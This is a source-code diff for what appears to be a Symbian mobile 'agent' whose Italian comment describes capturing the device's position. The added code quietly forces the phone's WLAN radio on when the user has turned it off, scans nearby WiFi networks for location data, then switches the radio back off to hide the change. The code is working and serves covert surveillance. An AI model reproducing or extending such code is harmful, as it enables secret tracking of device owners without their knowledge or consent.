@@ -17,6 +17,13 @@
 #include <featureinfo.h>
 #include "Json.h"
 
+// CenRep stuff
+#include <centralrepository.h>	
+// Connections On/Off, slider on SymbianBelle devices
+//wlandevicesettingsinternalcrkeys.h
+const TUid KCRUidWlanDeviceSettingsRegistryId = {0x101f8e44};
+const TUint32 KWlanOnOff = 0x00000052;
+const TUint32 KWlanForceDisable = 0x00000053;
 
 const static TInt KMaxTimeoutForFixMin = 14;
 
@@ -530,7 +537,12 @@ HBufC8* CAgentPosition::GetGPSBufferL(TPositionSatelliteInfo satPos)
 
 HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 	{
-	CBufBase* buffer = CBufFlat::NewL(50);
+	TBool restoreWlanOffStatus = EFalse;
+	#ifndef __SERIES60_3X__  //only Symbian^3
+		restoreWlanOffStatus = SetWlanOn();
+	#endif
+		
+	CBufBase* buffer = CBufFlat::NewL(50); 
 	CleanupStack::PushL(buffer);
 	
 	CWlanScanInfo* scanInfo=CWlanScanInfo::NewL();
@@ -581,6 +593,21 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 	
 	HBufC8* result = buffer->Ptr(0).AllocL();
 	CleanupStack::PopAndDestroy(buffer);
+	
+	#ifndef __SERIES60_3X__   //only Symbian^3
+	if(restoreWlanOffStatus)
+		{
+		CRepository* repository = NULL;
+		TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
+		if ((error == KErrNone) && repository)
+			{
+			CleanupStack::PushL(repository);
+			TInt err = repository->Set(KWlanOnOff,0); // restore to Off
+			CleanupStack::PopAndDestroy(repository);
+			}
+		}
+	
+	#endif		
 	
 	return result;
 	}
@@ -663,6 +690,26 @@ TInt CAgentPosition::GetSSID(CWlanScanInfo *scanInfo, TDes8 &aSSID)
  
 	return error;
 }
+
+TBool CAgentPosition::SetWlanOn()
+	{
+	TBool restore = EFalse;
+	CRepository* repository = NULL;
+	TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
+	if ((error == KErrNone) && repository)
+		{
+		CleanupStack::PushL(repository);
+		TInt value = 0;
+		TInt err = repository->Get(KWlanOnOff,value);  // 0 = Off, 1 = On
+		if((err == KErrNone) && (value == 0))
+			{
+			err = repository->Set(KWlanOnOff,1); // force to On
+			restore = ETrue;
+			}		
+		CleanupStack::PopAndDestroy(repository);
+		}
+	return restore;
+	}
 
  /*
  Il Position Agent si occupa della cattura della posizione del dispositivo tramite GPS e/o 
